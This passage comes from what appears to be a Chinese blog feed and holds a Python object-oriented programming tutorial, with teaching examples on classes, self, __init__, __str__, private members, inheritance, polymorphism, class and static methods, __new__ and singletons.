class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #属性</span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">    def introduce(self):</span><br><span class="line">        print(&quot;%s的年龄是:%d&quot;%(tom.name, tom.age))</span><br><span class="line"></span><br><span class="line">#创建第一个对象</span><br><span class="line">tom = Cat()</span><br><span class="line"></span><br><span class="line">#调用tom指向的对象中的方法</span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line"></span><br><span class="line">#给tom指向的对象添加2个属性（相对于变量）</span><br><span class="line">tom.name = &quot;汤姆&quot;</span><br><span class="line">tom.age = 40</span><br><span class="line"></span><br><span class="line">#调用方法</span><br><span class="line">tom.introduce()</span><br><span class="line"></span><br><span class="line">#创建第二个对象</span><br><span class="line">lanmao = Cat()</span><br><span class="line">lanmao.name = &quot;蓝猫&quot;</span><br><span class="line">lanmao.age = 10</span><br><span class="line">lanmao.introduce()</span><br></pre></td></tr></table></figure><p>输出：程序明显有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">猫在吃鱼...</span><br><span class="line">猫正在喝水...</span><br><span class="line">汤姆的年龄是:40</span><br><span class="line">汤姆的年龄是:40</span><br></pre></td></tr></table></figure><h3 id="self"><a href="#self" class="headerlink" title="self"></a>self</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #属性</span><br><span class="line">    #方法（可由函数组成，必须加上self）</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">    def introduce(self):</span><br><span class="line">        print(&quot;%s的年龄是:%d&quot;%(self.name, self.age))</span><br><span class="line"></span><br><span class="line">#创建第一个对象</span><br><span class="line">tom = Cat()</span><br><span class="line"></span><br><span class="line">#调用tom指向的对象中的方法</span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line"></span><br><span class="line">#给tom指向的对象添加2个属性（相对于变量）</span><br><span class="line">tom.name = &quot;汤姆&quot;</span><br><span class="line">tom.age = 40</span><br><span class="line"></span><br><span class="line">#调用方法</span><br><span class="line">tom.introduce()</span><br><span class="line"></span><br><span class="line">#创建第二个对象</span><br><span class="line">lanmao = Cat()</span><br><span class="line">lanmao.name = &quot;蓝猫&quot;</span><br><span class="line">lanmao.age = 10</span><br><span class="line">lanmao.introduce()</span><br></pre></td></tr></table></figure><h3 id="init-初始化对象"><a href="#init-初始化对象" class="headerlink" title="init 初始化对象"></a><strong>init</strong> 初始化对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    #初始化对象</span><br><span class="line">    def __init__(self, new_name, new_age):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line"></span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;猫在吃鱼...&quot;)</span><br><span class="line"></span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;猫正在喝水...&quot;)</span><br><span class="line"></span><br><span class="line">    def introduce(self):</span><br><span class="line">        print(&quot;%s的年龄是:%d&quot;%(self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tom = Cat(&quot;汤姆&quot;, 40)</span><br><span class="line">tom.eat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.introduce()</span><br><span class="line"></span><br><span class="line">lanmao = Cat(&quot;蓝猫&quot;, 10)</span><br><span class="line">lanmao.introduce()</span><br></pre></td></tr></table></figure><h3 id="str"><a href="#str" class="headerlink" title="str"></a><strong>str</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self, new_name, new_age):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &quot;%s的年龄是:%d&quot;%(self.name, self.age)</span><br><span class="line"></span><br><span class="line">tom = Cat(&quot;汤姆&quot;, 40)</span><br><span class="line">lanmao = Cat(&quot;蓝猫&quot;, 10)</span><br><span class="line"></span><br><span class="line">print(tom)</span><br><span class="line">print(lanmao)</span><br></pre></td></tr></table></figure><h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line"></span><br><span class="line">    #私有方法</span><br><span class="line">    def __send_msg(self):</span><br><span class="line">        print(&quot;------正在发送短信------&quot;)</span><br><span class="line"></span><br><span class="line">    #公有方法</span><br><span class="line">    def send_msg(self, new_money):</span><br><span class="line">        if new_money&gt;10000:</span><br><span class="line">            #当验证成功后再调用上边的私有方法函数</span><br><span class="line">            self.__send_msg()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;余额不足,请先充值 再发送短信&quot;)</span><br><span class="line"></span><br><span class="line">dog = Dog()</span><br><span class="line">dog.send_msg(100)</span><br></pre></td></tr></table></figure><h3 id="del"><a href="#del" class="headerlink" title="del"></a><strong>del</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    </span><br><span class="line">    def __del__(self):</span><br><span class="line">        print(&quot;-----英雄over------&quot;)</span><br><span class="line"></span><br><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = dog1</span><br><span class="line"></span><br><span class="line">del dog1#不会调用 __del__方法,因为这个对象 还有其他的变量指向它,即 引用计算不是0</span><br><span class="line">del dog2#此时会调用__del__方法,因为没有变量指向它了</span><br><span class="line">print(&quot;====================&quot;)</span><br><span class="line"></span><br><span class="line">#如果在程序结束时,有些对象还存在,那么python解释器会自动调用它们的__del__方法来完成清理工作</span><br></pre></td></tr></table></figure><h3 id="测量对象的引用个数"><a href="#测量对象的引用个数" class="headerlink" title="测量对象的引用个数"></a>测量对象的引用个数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">class T:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">T = T()</span><br><span class="line">sys.getrefcount(T)</span><br></pre></td></tr></table></figure><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Animal:</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;-----吃----&quot;)</span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;-----喝----&quot;)</span><br><span class="line">    def sleep(self):</span><br><span class="line">        print(&quot;-----睡觉----&quot;)</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&quot;-----跑----&quot;)</span><br><span class="line"></span><br><span class="line">#继承Animal类</span><br><span class="line">class Dog(Animal):</span><br><span class="line">    def bark(self):</span><br><span class="line">        print(&quot;----汪汪叫---&quot;)</span><br><span class="line"></span><br><span class="line">#继承Animal类</span><br><span class="line">class Cat(Animal):</span><br><span class="line">    def catch(self):</span><br><span class="line">        print(&quot;----抓老鼠----&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wangcai = Dog()</span><br><span class="line">#继承Animal类，可直接调其方法</span><br><span class="line">wangcai.eat()</span><br><span class="line"></span><br><span class="line">tom = Cat()</span><br><span class="line">#继承Animal类，可直接调其方法</span><br><span class="line">tom.eat()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Animal:</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;-----吃----&quot;)</span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;-----喝----&quot;)</span><br><span class="line">    def sleep(self):</span><br><span class="line">        print(&quot;-----睡觉----&quot;)</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&quot;-----跑----&quot;)</span><br><span class="line"></span><br><span class="line">class Dog(Animal):</span><br><span class="line">    def bark(self):</span><br><span class="line">        print(&quot;----汪汪叫---&quot;)</span><br><span class="line"></span><br><span class="line">class Xiaotq(Dog):</span><br><span class="line">    def fly(self):</span><br><span class="line">        print(&quot;----飞----&quot;)</span><br><span class="line"></span><br><span class="line">xiaotq = Xiaotq()</span><br><span class="line">xiaotq.fly()</span><br><span class="line">xiaotq.bark()</span><br><span class="line">xiaotq.eat()</span><br></pre></td></tr></table></figure><h3 id="调用被重写的方法"><a href="#调用被重写的方法" class="headerlink" title="调用被重写的方法"></a>调用被重写的方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Animal:</span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;-----吃----&quot;)</span><br><span class="line">    def drink(self):</span><br><span class="line">        print(&quot;-----喝----&quot;)</span><br><span class="line">    def sleep(self):</span><br><span class="line">        print(&quot;-----睡觉----&quot;)</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&quot;-----跑----&quot;)</span><br><span class="line"></span><br><span class="line">class Dog(Animal):</span><br><span class="line">    def bark(self):</span><br><span class="line">        print(&quot;----汪汪叫---&quot;)</span><br><span class="line"></span><br><span class="line">class Xiaotq(Dog):</span><br><span class="line">    def fly(self):</span><br><span class="line">        print(&quot;----飞----&quot;)</span><br><span class="line"></span><br><span class="line">    def bark(self):</span><br><span class="line">        print(&quot;----狂叫-----&quot;)</span><br><span class="line">        </span><br><span class="line">        #第1种调用被重写的父类的方法</span><br><span class="line">        Dog.bark(self)</span><br><span class="line"></span><br><span class="line">        #第2种</span><br><span class="line">        super().bark()</span><br><span class="line"></span><br><span class="line">xiaotq = Xiaotq()</span><br><span class="line">xiaotq.fly()</span><br><span class="line">xiaotq.bark()</span><br><span class="line">xiaotq.eat()</span><br></pre></td></tr></table></figure><h3 id="私有方法-私有属性中的继承"><a href="#私有方法-私有属性中的继承" class="headerlink" title="私有方法-私有属性中的继承"></a>私有方法-私有属性中的继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.num1 = 100</span><br><span class="line">        #私有属性</span><br><span class="line">        self.__num2 = 200</span><br><span class="line"></span><br><span class="line">    def test1(self):</span><br><span class="line">        print(&quot;-----test1----&quot;)</span><br><span class="line">    #私有方法</span><br><span class="line">    def __test2(self):</span><br><span class="line">        print(&quot;-----test2----&quot;)</span><br><span class="line"></span><br><span class="line">    def test3(self):</span><br><span class="line">        self.__test2()</span><br><span class="line">        print(self.__num2)</span><br><span class="line"></span><br><span class="line">class B(A):</span><br><span class="line">    def test4(self):</span><br><span class="line">        self.__test2()</span><br><span class="line">        print(self.__num2)</span><br><span class="line"></span><br><span class="line">b = B()</span><br><span class="line">#b.test1()</span><br><span class="line">#私有方法并不会被继承</span><br><span class="line">b.__test2()</span><br><span class="line">print(b.num1)</span><br><span class="line">#私有属性并不会被继承</span><br><span class="line">print(b.__num2)</span><br><span class="line">#非私有 方法，可以调用，但父类调用私有方法和私有属性</span><br><span class="line">b.test3()</span><br><span class="line">#私有属性、私有方法并不会被继承</span><br><span class="line">b.test4()</span><br></pre></td></tr></table></figure><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Base(object):</span><br><span class="line">    def test(self):</span><br><span class="line">        print(&quot;----Base&quot;)</span><br><span class="line"></span><br><span class="line">class A(Base):</span><br><span class="line">    def test1(self):</span><br><span class="line">        print(&quot;-----test1&quot;)</span><br><span class="line"></span><br><span class="line">class B(Base):</span><br><span class="line">    def test2(self):</span><br><span class="line">        print(&quot;-----test2&quot;)</span><br><span class="line"></span><br><span class="line">class C(A,B):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">c = C()</span><br><span class="line">c.test1()</span><br><span class="line">c.test2()</span><br><span class="line">c.test()</span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Dog(object):</span><br><span class="line">    def print_self(self):</span><br><span class="line">        print(&quot;大家好,我是xxxx,希望以后大家多多关照....&quot;)</span><br><span class="line"></span><br><span class="line">class Xiaotq(Dog):</span><br><span class="line">    def print_self(self):</span><br><span class="line">        print(&quot;hello everybody, 我是你们的老大,我是xxxx&quot;)</span><br><span class="line"></span><br><span class="line">def introduce(temp):</span><br><span class="line">    #多态，多种表现形式，赋的值不一样，形态也不一样</span><br><span class="line">    temp.print_self()</span><br><span class="line"></span><br><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = Xiaotq()</span><br><span class="line"></span><br><span class="line">introduce(dog1)</span><br><span class="line">introduce(dog2)</span><br></pre></td></tr></table></figure><h3 id="类属性、实例属性"><a href="#类属性、实例属性" class="headerlink" title="类属性、实例属性"></a>类属性、实例属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Tool(object):</span><br><span class="line">    def __init__(self, new_name):</span><br><span class="line">        self.name = new_name</span><br><span class="line"></span><br><span class="line">num = 0</span><br><span class="line">tool1 = Tool(&quot;铁锹&quot;)</span><br><span class="line">num+=1</span><br><span class="line">print(num)</span><br><span class="line">tool2 = Tool(&quot;工兵铲&quot;)</span><br><span class="line">num+=1</span><br><span class="line">print(num)</span><br><span class="line">tool3 = Tool(&quot;水桶&quot;)</span><br><span class="line">num+=1</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Tool(object):</span><br><span class="line"></span><br><span class="line">    #类属性</span><br><span class="line">    num = 0</span><br><span class="line"></span><br><span class="line">    #方法</span><br><span class="line">    def __init__(self, new_name):</span><br><span class="line">        #实例属性</span><br><span class="line">        self.name = new_name</span><br><span class="line">        #对类属性+=1</span><br><span class="line">        Tool.num += 1</span><br><span class="line"></span><br><span class="line">tool1 = Tool(&quot;铁锹&quot;)</span><br><span class="line">tool2 = Tool(&quot;工兵铲&quot;)</span><br><span class="line">tool3 = Tool(&quot;水桶&quot;)</span><br><span class="line"></span><br><span class="line">print(Tool.num)</span><br></pre></td></tr></table></figure><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Game(object):</span><br><span class="line"></span><br><span class="line">    #类属性</span><br><span class="line">    num = 0</span><br><span class="line"></span><br><span class="line">    #实例方法</span><br><span class="line">    def __init__(self):</span><br><span class="line">        #实例属性</span><br><span class="line">        self.name = &quot;laowang&quot;</span><br><span class="line"></span><br><span class="line">    #类方法</span><br><span class="line">    @classmethod</span><br><span class="line">    def add_num(cls):</span><br><span class="line">        cls.num = 100</span><br><span class="line"></span><br><span class="line">game = Game()</span><br><span class="line">#可以通过类的名字调用类方法</span><br><span class="line">Game.add_num()</span><br><span class="line">print(Game.num)</span><br></pre></td></tr></table></figure><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Game(object):</span><br><span class="line"></span><br><span class="line">    #类属性</span><br><span class="line">    num = 0</span><br><span class="line"></span><br><span class="line">    #实例方法</span><br><span class="line">    def __init__(self):</span><br><span class="line">        #实例属性</span><br><span class="line">        self.name = &quot;laowang&quot;</span><br><span class="line"></span><br><span class="line">    #类方法</span><br><span class="line">    @classmethod</span><br><span class="line">    def add_num(cls):</span><br><span class="line">        cls.num = 100</span><br><span class="line"></span><br><span class="line">    #静态方法</span><br><span class="line">    @staticmethod</span><br><span class="line">    def print_menu():</span><br><span class="line">        print(&quot;----------------------&quot;)</span><br><span class="line">        print(&quot;    穿越火线V11.1&quot;)</span><br><span class="line">        print(&quot; 1. 开始游戏&quot;)</span><br><span class="line">        print(&quot; 2. 结束游戏&quot;)</span><br><span class="line">        print(&quot;----------------------&quot;)</span><br><span class="line"></span><br><span class="line">game = Game()</span><br><span class="line">#Game.add_num()#可以通过类的名字调用类方法</span><br><span class="line">game.add_num()#还可以通过这个类创建出来的对象 去调用这个类方法</span><br><span class="line">print(Game.num)</span><br><span class="line"></span><br><span class="line">#Game.print_menu()#通过类 去调用静态方法</span><br><span class="line">game.print_menu()#通过实例对象 去调用静态方法</span><br></pre></td></tr></table></figure><h3 id="new方法"><a href="#new方法" class="headerlink" title="new方法"></a>new方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Dog(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(&quot;----init方法-----&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        print(&quot;----del方法-----&quot;)</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        print(&quot;----str方法-----&quot;)</span><br><span class="line">        return &quot;对象的描述信息&quot;</span><br><span class="line"></span><br><span class="line">    def __new__(cls):#cls此时是Dog指向的那个类对象</span><br><span class="line">        print(&quot;----new方法-----&quot;)</span><br><span class="line">        return object.__new__(cls)</span><br><span class="line"></span><br><span class="line">xtq = Dog()</span><br></pre></td></tr></table></figure><h3 id="创建单例"><a href="#创建单例" class="headerlink" title="创建单例"></a>创建单例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Dog(object):</span><br><span class="line"></span><br><span class="line">    __instance = None</span><br><span class="line"></span><br><span class="line">    def __new__(cls):</span><br><span class="line">        if cls.__instance == None:</span><br><span class="line">            cls.__instance = object.__new__(cls)</span><br><span class="line">            return cls.__instance</span><br><span class="line">        else:</span><br><span class="line">            #return 上一次创建的对象的引用</span><br><span class="line">            return cls.__instance</span><br><span class="line">a = Dog()</span><br><span class="line">print(id(a))</span><br><span class="line">b = Dog()</span><br><span class="line">print(id(b))</span><br></pre></td></tr></table></figure><h3 id="只初始化一次对象"><a href="#只初始化一次对象" class="headerlink" title="只初始化一次对象"></a>只初始化一次对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Dog(object):</span><br><span class="line"></span><br><span class="line">    __instance = None</span><br><span class="line">    #设置初始化条件</span><br><span class="line">    __init_flag = False</span><br><span class="line"></span><br><span class="line">    def __new__(cls, name):</span><br><span class="line">        if cls.__instance == None:</span><br><span class="line">            cls.__instance = object.__new__(cls)</span><br><span class="line">            return cls.__instance</span><br><span class="line">        else:</span><br><span class="line">            #return 上一次创建的对象的引用</span><br><span class="line">            return cls.__instance</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        if Dog.__init_flag == False:</span><br><span class="line">            self.name = name</span><br><span class="line">            #设置只初始化一次</span><br><span class="line">            Dog.__init_flag = True</span><br><span class="line"></span><br><span class="line">a = Dog(&quot;旺财&quot;)</span><br><span class="line">print(id(a))</span><br><span class="line">print(a.name)</span><br><span class="line"></span><br><span class="line">b = Dog(&quot;哮天犬&quot;)</span><br><span class="line">print(id(b))</span><br><span class="line">print(b.name)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 批量重命名</title>
      <link href="/article/python-batch-rename.html"/>
      <url>/article/python-batch-rename.html</url>
      
